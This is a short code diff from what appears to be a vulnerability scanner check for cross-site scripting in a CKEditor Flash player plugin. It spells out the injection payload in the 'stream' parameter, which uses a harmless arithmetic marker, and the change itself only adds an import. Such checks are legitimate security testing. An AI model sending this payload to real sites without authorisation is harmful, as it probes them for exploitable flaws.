@@ -13,6 +13,7 @@ def _verify(url, cookies, uagent, vulns, proxy):
     }
     payload = "statics/js/ckeditor/plugins/flashplayer/player/player.swf?skin=skin.swf&stream=\%22))}catch(e){document.write(12345*54321)}//"
     try:
+        import urllib
         from selenium import webdriver
         from selenium.webdriver.chrome.options import Options
         from selenium.webdriver.support import expected_conditions as EC
